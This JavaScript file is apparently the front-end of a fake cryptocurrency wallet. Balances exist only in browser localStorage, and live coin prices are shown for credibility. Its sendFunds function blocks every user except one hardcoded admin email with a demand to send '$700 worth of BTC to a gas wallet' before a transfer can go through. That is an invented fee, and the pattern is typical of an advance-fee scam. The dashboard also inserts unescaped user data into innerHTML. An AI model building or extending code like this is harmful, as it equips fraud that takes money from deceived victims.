const email = localStorage.getItem('currentUser');
const users = JSON.parse(localStorage.getItem('users') || '{}');
const user = users[email];

function updateDashboard() {
  document.getElementById('walletInfo').innerHTML = `
    <p><strong>Email:</strong> ${email}</p>
    <p><strong>Wallet ID:</strong> ${user.walletId}</p>
    <pre>${JSON.stringify(user.balance, null, 2)}</pre>`;

  const historyList = document.getElementById('history');
  historyList.innerHTML = '';
  user.transactions.forEach(tx => {
    const li = document.createElement('li');
    li.textContent = `${tx.date}: ${tx.type} ${tx.amount} ${tx.currency} with ${tx.email}`;
    historyList.appendChild(li);
  });
}

async function loadPrices() {
  const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,litecoin,tether,binancecoin&vs_currencies=usd');
  const prices = await res.json();
  const ctx = document.getElementById('priceChart').getContext('2d');
  new Chart(ctx, {
    type: 'bar',
    data: {
      labels: ['BTC', 'ETH', 'LTC', 'USDT', 'BNB'],
      datasets: [{
        label: 'USD Price',
        data: [prices.bitcoin.usd, prices.ethereum.usd, prices.litecoin.usd, prices.tether.usd, prices.binancecoin.usd],
        backgroundColor: ['#f7931a', '#3c3c3d', '#b4b4b4', '#26a17b', '#f0b90b']
      }]
    }
  });
}

function sendFunds() {
  const to = document.getElementById('to').value;
  const currency = document.getElementById('currency').value;
  const amount = parseFloat(document.getElementById('amount').value);

  if (!users[to]) {
    alert('Recipient not found');
    return;
  }

  const isAdmin = email === 'theresamatt009@gmail.com';
  if (!isAdmin && user.balance.BTC < 700) {
    alert('You must send $700 worth of BTC to a gas wallet before this transaction can process.');
    return;
  }

  if (user.balance[currency] < amount) {
    alert('Insufficient funds');
    return;
  }

  user.balance[currency] -= amount;
  users[to].balance[currency] += amount;

  const tx = {
    type: 'sent',
    email: to,
    currency,
    amount,
    date: new Date().toLocaleString()
  };
  user.transactions.push(tx);
  users[to].transactions.push({ ...tx, type: 'received', email });

  localStorage.setItem('users', JSON.stringify(users));
  updateDashboard();
  alert('Transfer complete');
}

updateDashboard();
loadPrices();
